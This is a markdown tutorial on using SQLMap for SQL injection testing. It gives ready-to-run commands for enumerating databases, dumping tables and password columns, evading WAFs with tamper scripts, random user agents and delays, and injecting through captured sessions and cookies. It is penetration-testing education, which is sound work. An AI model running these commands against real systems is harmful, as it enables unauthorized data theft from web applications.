# SQLMap Guide: Beginner to Advanced

## Table of Contents

1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Basic Usage](#basic-usage)
4. [POST Request Testing](#post-request-testing)
5. [Using Request Files from Burp Suite](#using-request-files-from-burp-suite)
6. [Target Enumeration](#target-enumeration)
7. [Advanced Options](#advanced-options)
8. [Bypassing Filters & WAFs](#bypassing-filters--wafs)
9. [Tamper Scripts](#tamper-scripts)
10. [Dumping Data](#dumping-data)
11. [Authentication and Sessions](#authentication-and-sessions)
12. [Common Problems & Troubleshooting](#common-problems--troubleshooting)
13. [Best Practices](#best-practices)

## Introduction

**SQLMap** is an open-source penetration testing tool that automates the detection and exploitation of SQL injection flaws. It's extremely powerful for extracting data from vulnerable databases.

## Installation

```bash
sudo apt update
sudo apt install sqlmap
```

Or clone the latest version:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
```

Run with:

```bash
python3 sqlmap.py
```

## Basic Usage

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch
```

* `-u` : Target URL
* `--batch` : Non-interactive mode (auto-confirm)

To test specific parameters:

```bash
sqlmap -u "http://example.com/page.php" --data="id=1&submit=submit" --batch
```

## POST Request Testing

```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=123" --batch
```

You can test only one field:

```bash
--data="username=admin&password=*"
```

## Using Request Files from Burp Suite

1. Capture request in Burp.
2. Save as request.txt
3. Run:

```bash
sqlmap -r request.txt --batch
```

Optional:

```bash
--level=5 --risk=3 --technique=BEUSTQ
```

## Target Enumeration

### List Databases

```bash
sqlmap -u URL --dbs
```

### List Tables

```bash
sqlmap -u URL -D <dbname> --tables
```

### List Columns

```bash
sqlmap -u URL -D <dbname> -T <tablename> --columns
```

### Dump Data

```bash
sqlmap -u URL -D <dbname> -T <tablename> --dump
```

## Advanced Options

* `--level=N` (1–5): Controls test depth. Higher = more tests.
* `--risk=N` (1–3): Controls the risk of tests (e.g., time delays).
* `--technique=BEUSTQ`: Choose specific SQLi techniques:

  * B: Boolean-based
  * E: Error-based
  * U: Union-based
  * S: Stacked queries
  * T: Time-based
  * Q: Inline queries

## Bypassing Filters & WAFs

* `--tamper=<script>`: Use tamper scripts to bypass WAF/filters.
* `--random-agent`: Use a random User-Agent.
* `--delay=3`: Add delay between requests.
* `--threads=1`: Use single thread (avoid detection).

## Tamper Scripts

Located in:

```bash
/usr/share/sqlmap/tamper/  # or sqlmap/tamper/
```

Examples:

```bash
--tamper=space2comment
--tamper=between,randomcase
```

Chain multiple with commas.

## Dumping Data

```bash
sqlmap -u URL -D <dbname> -T <table> --dump
```

Dump specific columns:

```bash
--dump -C "user,password"
```

## Authentication and Sessions

### Using Cookies

```bash
--cookie="PHPSESSID=abcd1234"
```

### HTTP Authentication

```bash
--auth-type=Basic --auth-cred="admin:password"
```

### Session Files

Use Burp's session file with `-r`.

## Common Problems & Troubleshooting

* **Not detecting injection**: Try increasing `--level` and `--risk`.
* **Blocked by WAF**: Use `--tamper`, `--random-agent`, and `--delay`.
* **CSRF Tokens**: Use session or manually update token in the request.
* **Captcha or MFA**: Manual testing might be required.

## Best Practices

* Understand the web app before running automated tools.
* Use `--batch` only when confident.
* Avoid high risk tests on production systems.
* Always respect scope and permissions.
* Combine with Burp Suite for best results.

---
